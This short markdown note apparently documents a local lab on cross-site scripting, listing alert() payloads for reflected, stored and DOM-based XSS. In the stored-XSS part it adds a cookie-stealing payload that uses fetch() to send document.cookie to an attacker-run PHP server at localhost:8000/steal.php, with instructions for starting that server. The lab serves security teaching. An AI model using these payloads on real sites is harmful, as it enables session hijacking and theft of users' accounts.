# Attack

### Reflected XSS

Payload

```bash
<script>alert('Hacked!')</script>
```

### Stored XSS

Payload

```bash
<script>alert('Hacked!')</script>
```

Further Demonstration: Stealing Cookies

> [!WARNING]
> Need to run the attacker server  
> Attacker File `C:\xampp\htdocs\attacker`
> Run the php attack server `C:\xampp\php\php -S 127.0.0.1:8000`
> Access the Server: `http://localhost:8000/steal.php`

```bash
<script> fetch('http://localhost:8000/steal.php?cookie=' + document.cookie); </script>	
```

### DOM-based XSS

Payload: 

```bash
<img src=x onerror="alert('XSS Attack')">
```

> [!NOTE]
> 
> The attack may seem a bit convoluted, and it is, but that's because there are basic protections to prevent the simplest XSS attacks; [script](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML) tags added via innerHTML are not executed automatically.
